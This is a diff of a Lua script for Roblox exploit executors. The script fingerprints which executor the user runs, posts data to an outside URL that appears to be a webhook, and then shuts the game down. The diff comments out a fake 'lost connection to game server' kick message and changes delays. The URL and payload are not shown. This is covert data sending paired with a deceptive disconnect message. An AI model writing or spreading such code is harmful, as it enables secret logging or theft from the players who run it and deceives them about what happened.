@@ -1,5 +1,5 @@
-   wait(00)
-    game.Players.LocalPlayer:Kick("lost connection to game server, please try reconnecting")
+   wait(1200)
+    --game.Players.LocalPlayer:Kick("lost connection to game server, please try reconnecting")
 local webhookcheck =
     syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or identifyexecutor():find("ScriptWare") or "unsupported"
    
@@ -19,5 +19,5 @@ local headers = {
 request = http_request or request or syn.request or http.request or fluxus.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
-wait(5)
+wait(2)
 game:Shutdown()
